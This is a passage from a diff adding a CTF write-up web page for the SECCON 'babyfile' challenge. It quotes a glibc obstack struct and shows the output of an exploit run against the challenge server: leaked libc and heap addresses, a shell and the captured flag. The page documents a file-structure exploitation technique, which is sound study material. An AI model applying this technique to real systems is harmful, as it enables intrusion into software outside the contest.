+</span><span style="color:#f1fa8c">  char *next_free;              /* where to add next char to current object */
+</span><span style="color:#f1fa8c">  char *chunk_limit;            /* address of char after current chunk */
+</span><span style="color:#f1fa8c">  union
+</span><span style="color:#f1fa8c">  {
+</span><span style="color:#f1fa8c">    PTR_INT_TYPE tempint;
+</span><span style="color:#f1fa8c">    void *tempptr;
+</span><span style="color:#f1fa8c">  } temp;                       /* Temporary for some macros.  */
+</span><span style="color:#f1fa8c">  int alignment_mask;           /* Mask of alignment for each object. */
+</span><span style="color:#f1fa8c">  /* These prototypes vary based on &#39;use_extra_arg&#39;, and we use
+</span><span style="color:#f1fa8c">     casts to the prototypeless function type in all assignments,
+</span><span style="color:#f1fa8c">     but having prototypes here quiets -Wstrict-prototypes.  */
+</span><span style="color:#f1fa8c">  struct _obstack_chunk *(*chunkfun) (void *, long);
+</span><span style="color:#f1fa8c">  void (*freefun) (void *, struct _obstack_chunk *);
+</span><span style="color:#f1fa8c">  void *extra_arg;              /* first arg for chunk alloc/dealloc funcs */
+</span><span style="color:#f1fa8c">  unsigned use_extra_arg : 1;     /* chunk alloc/dealloc funcs take extra arg */
+</span><span style="color:#f1fa8c">  unsigned maybe_empty_object : 1; /* There is a possibility that the current
+</span><span style="color:#f1fa8c">				      chunk contains a zero-length object.  This
+</span><span style="color:#f1fa8c">				      prevents freeing the chunk if we allocate
+</span><span style="color:#f1fa8c">				      a bigger chunk to replace it. */
+</span><span style="color:#f1fa8c">  unsigned alloc_failed : 1;      /* No longer used, as we now call the failed
+</span><span style="color:#f1fa8c">				     handler on error, but retained for binary
+</span><span style="color:#f1fa8c">				     compatibility.  */
+</span><span style="color:#f1fa8c">};
+</span><span style="color:#f1fa8c">
+</span><span style="color:#f1fa8c">nasm@off:~/Documents/pwn/seccon/babyfile$ time python3 exploit.py REMOTE HOST=babyfile.seccon.games PORT=3157
+</span><span style="color:#f1fa8c">[*] &#39;/home/nasm/Documents/pwn/seccon/babyfile/chall&#39;
+</span><span style="color:#f1fa8c">    Arch:     amd64-64-little
+</span><span style="color:#f1fa8c">    RELRO:    Full RELRO
+</span><span style="color:#f1fa8c">    Stack:    Canary found
+</span><span style="color:#f1fa8c">    NX:       NX enabled
+</span><span style="color:#f1fa8c">    PIE:      PIE enabled
+</span><span style="color:#f1fa8c">[*] &#39;/home/nasm/Documents/pwn/seccon/babyfile/libc-2.31.so&#39;
+</span><span style="color:#f1fa8c">    Arch:     amd64-64-little
+</span><span style="color:#f1fa8c">    RELRO:    Partial RELRO
+</span><span style="color:#f1fa8c">    Stack:    Canary found
+</span><span style="color:#f1fa8c">    NX:       NX enabled
+</span><span style="color:#f1fa8c">    PIE:      PIE enabled
+</span><span style="color:#f1fa8c">[+] Opening connection to babyfile.seccon.games on port 3157: Done
+</span><span style="color:#f1fa8c">[*] libc: 0x7fe2bc538000
+</span><span style="color:#f1fa8c">[*] heap: 0x55fd27776000
+</span><span style="color:#f1fa8c">[*] _IO_obstack_jumps: 0x7fe2bc721260
+</span><span style="color:#f1fa8c">[*] Switching to interactive mode
+</span><span style="color:#f1fa8c">SECCON</span><span style="color:#f1fa8c">{r34d_4nd_wr173_4nywh3r3_w17h_f1l3_57ruc7ur3}</span><span style="color:#f1fa8c">
+</span><span style="color:#f1fa8c">[*] Got EOF while reading in interactive
+</span><span style="color:#f1fa8c">$
+</span><span style="color:#f1fa8c">&#34;&#34;&#34;</span>
+</code></pre></div>
+    </div>
+    <div class="post-footer">
+      
+    </div>
+  </article>
+
+    </main>
+  </body>
+</html>
